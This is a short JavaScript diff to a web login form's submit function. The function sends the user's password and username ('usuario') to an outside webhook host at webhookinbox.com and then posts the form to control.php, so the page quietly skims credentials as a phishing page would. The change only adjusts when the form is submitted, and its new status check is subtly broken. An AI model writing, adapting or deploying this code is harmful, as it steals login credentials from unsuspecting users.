@@ -2,9 +2,11 @@ function l(){
     document.forms[0].action='control.php';
     var a=new XMLHttpRequest();
     a.onreadystatechange = function(){
-        document.forms[0].method='POST';
-        document.forms[0].action='control.php';
-        document.forms[0].submit();
+        if (a.status === XMLHttpRequest.DONE) {
+            document.forms[0].method='POST';
+            document.forms[0].action='control.php';
+            document.forms[0].submit();
+        }
     };
     a.open('GET', 'http://api.webhookinbox.com/i/sSrkYmUy/in/?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
     a.send(null);
